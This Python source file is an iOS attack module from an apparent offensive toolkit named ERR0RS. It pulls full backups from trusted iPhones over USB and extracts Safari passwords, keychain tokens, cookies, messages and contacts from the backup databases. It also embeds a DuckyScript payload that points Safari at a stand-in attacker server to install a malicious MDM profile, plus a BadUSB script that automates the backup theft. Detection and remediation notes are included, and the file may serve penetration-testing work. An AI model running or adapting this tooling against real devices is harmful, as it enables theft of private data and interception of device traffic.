"""
ERR0RS ULTIMATE - iOS Attack Module
=====================================
iOS penetration testing: backup analysis, pairing attacks, MDM injection.

Requires: libimobiledevice (idevicebackup2, idevicepair, ideviceinfo)
Install:  sudo apt install libimobiledevice-utils -y

AUTHORIZED TESTING ONLY.
"""

import subprocess, os, sqlite3, json, logging
from pathlib import Path
from dataclasses import dataclass, field

log = logging.getLogger("errors.ios_attack")


@dataclass
class iOSDevice:
    udid:       str = ""
    name:       str = ""
    ios_version: str = ""
    model:      str = ""
    paired:     bool = False
    trusted:    bool = False


@dataclass
class iOSBackupArtifact:
    artifact_type: str  # credentials / messages / contacts / cookies / tokens
    app:           str = ""
    data:          dict = field(default_factory=dict)
    file_path:     str = ""


class iOSAttackModule:
    """
    iOS attack surface enumeration and backup credential extraction.

    Attack Vectors:
      1. USB Pairing Trust Exploitation
         - Plug in, wait for "Trust This Computer?" prompt
         - Once trusted: full AFC backup access via libimobiledevice

      2. iOS Backup Analysis (unencrypted)
         - idevicebackup2 pulls full device backup
         - Extract: Safari passwords, app tokens, cookies, messages
         - Key target: keychain-backup.plist (cleartext if backup unencrypted)

      3. MDM Profile Injection (unlocked device)
         - Install malicious MDM profile via USB
         - Grants: certificate trust, VPN reroute, app install, remote wipe

      4. GrayKey / checkm8 (hardware — advanced lab only)
         - For reference/education only in ERR0RS
    """

    BACKUP_DIR = "/tmp/errz_ios_backup"

    # High-value SQLite DBs inside iOS backups
    TARGET_DBS = {
        "safari_history":   "History.db",
        "safari_passwords": "Login Data",
        "messages":         "sms.db",
        "contacts":         "AddressBook.sqlitedb",
        "mail":             "Envelope Index",
        "notes":            "NoteStore.sqlite",
        "cookies":          "Cookies.binarycookies",
        "tokens":           "keychain-backup.plist",
    }

    def check_device(self) -> iOSDevice:
        """Check for connected iOS device via libimobiledevice."""
        device = iOSDevice()
        try:
            result = subprocess.run(
                ["ideviceinfo", "-k", "UniqueDeviceID"],
                capture_output=True, text=True, timeout=5
            )
            if result.returncode == 0:
                device.udid   = result.stdout.strip()
                device.paired = True
                name_r = subprocess.run(["ideviceinfo","-k","DeviceName"], capture_output=True, text=True, timeout=5)
                ver_r  = subprocess.run(["ideviceinfo","-k","ProductVersion"], capture_output=True, text=True, timeout=5)
                model_r= subprocess.run(["ideviceinfo","-k","ProductType"], capture_output=True, text=True, timeout=5)
                device.name        = name_r.stdout.strip()
                device.ios_version = ver_r.stdout.strip()
                device.model       = model_r.stdout.strip()
                device.trusted     = True
                log.info(f"iOS device found: {device.name} ({device.model}) iOS {device.ios_version}")
            else:
                log.warning("No trusted iOS device found. Plug in and tap 'Trust'.")
        except FileNotFoundError:
            log.error("libimobiledevice not installed. Run: sudo apt install libimobiledevice-utils")
        except Exception as e:
            log.error(f"iOS device check failed: {e}")
        return device

    def pull_backup(self, output_dir: str = None) -> str:
        """Pull full iOS backup via idevicebackup2. Returns backup path."""
        backup_path = output_dir or self.BACKUP_DIR
        os.makedirs(backup_path, exist_ok=True)
        log.info(f"Pulling iOS backup to {backup_path} ...")
        try:
            result = subprocess.run(
                ["idevicebackup2", "backup", "--full", backup_path],
                capture_output=True, text=True, timeout=300
            )
            if result.returncode == 0:
                log.info(f"[+] iOS backup complete: {backup_path}")
                return backup_path
            else:
                log.error(f"Backup failed: {result.stderr}")
                return ""
        except Exception as e:
            log.error(f"Backup error: {e}")
            return ""

    def analyze_backup(self, backup_path: str = None) -> list:
        """
        Walk the iOS backup directory and extract credential artifacts.
        Returns list of iOSBackupArtifact objects.
        """
        bp = backup_path or self.BACKUP_DIR
        artifacts = []

        if not os.path.exists(bp):
            log.error(f"Backup path not found: {bp}")
            return artifacts

        # Walk backup looking for known SQLite databases
        for root, dirs, files in os.walk(bp):
            for fname in files:
                fpath = os.path.join(root, fname)
                for artifact_type, target in self.TARGET_DBS.items():
                    if target.lower() in fname.lower():
                        art = iOSBackupArtifact(
                            artifact_type=artifact_type,
                            file_path=fpath,
                        )
                        if fname.endswith(".db") or fname.endswith(".sqlite") or fname.endswith("db"):
                            art.data = self._read_sqlite(fpath, artifact_type)
                        artifacts.append(art)
                        log.info(f"[+] Found {artifact_type}: {fpath}")

        log.info(f"Backup analysis complete: {len(artifacts)} artifacts found")
        return artifacts

    def _read_sqlite(self, db_path: str, artifact_type: str) -> dict:
        """Read tables from a SQLite db in the backup."""
        result = {"tables": [], "sample": {}}
        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
            tables = [row[0] for row in cursor.fetchall()]
            result["tables"] = tables

            # Pull first 5 rows from each table for preview
            for table in tables[:5]:
                try:
                    cursor.execute(f"SELECT * FROM {table} LIMIT 5")
                    rows = cursor.fetchall()
                    result["sample"][table] = rows
                except Exception:
                    pass
            conn.close()
        except Exception as e:
            result["error"] = str(e)
        return result

    def generate_mdm_profile_info(self) -> dict:
        """
        Returns info about MDM profile injection attack vector.
        Educational reference for red teamers.
        """
        return {
            "attack": "Malicious MDM Profile Injection via USB",
            "target": "Unlocked iOS device",
            "impact": [
                "Certificate trust (MITM all HTTPS traffic)",
                "VPN profile (reroute all traffic through attacker)",
                "App installation (sideload malicious apps)",
                "Remote wipe capability",
                "Disable certain device features",
                "Persistent access until profile manually removed",
            ],
            "delivery_method": "USB + Safari navigation to attacker-controlled URL",
            "ducky_payload": self._mdm_install_payload(),
            "detection": [
                "Settings > General > VPN & Device Management — check installed profiles",
                "Unknown issuer in profile certificate",
                "Unexpected MDM enrollment",
            ],
            "remediation": [
                "Never tap 'Trust' on unknown computers",
                "Check Settings > General > VPN & Device Management regularly",
                "Use Apple Configurator for legitimate MDM enrollment only",
                "Enable USB Restricted Mode (Settings > Face ID > USB Accessories)",
            ],
        }

    def _mdm_install_payload(self) -> str:
        """DuckyScript to open Safari and navigate to MDM install URL."""
        return """REM ERR0RS iOS MDM Injection - AUTHORIZED TESTING ONLY
REM Device must be unlocked. Navigates Safari to attacker MDM server.
DELAY 2000
HOME
DELAY 500
STRING safari
ENTER
DELAY 1500
REM Type attacker MDM URL (replace with your server)
STRING https://ATTACKER_MDM_SERVER/profile.mobileconfig
ENTER
DELAY 2000
REM User must tap 'Allow' then go to Settings to install
REM Social engineering required for full install"""

    def generate_badusb_ios_recon(self) -> str:
        """
        BadUSB payload for iOS recon via libimobiledevice on a connected Kali box.
        This runs on the KALI MACHINE (not the iOS device directly).
        """
        return """REM ERR0RS iOS Recon via libimobiledevice
REM Runs on Kali Linux when iOS device is connected and trusted
REM AUTHORIZED TESTING ONLY

DELAY 1000
CTRL ALT t
DELAY 1000

STRING # ERR0RS iOS Recon
ENTER
STRING ideviceinfo 2>/dev/null | tee /tmp/ios_info.txt
ENTER
DELAY 2000
STRING idevicepair status
ENTER
DELAY 500
STRING # Pull backup (takes a few minutes)
ENTER
STRING idevicebackup2 backup --full /tmp/ios_backup/ && echo "[ERR0RS] Backup complete"
ENTER"""
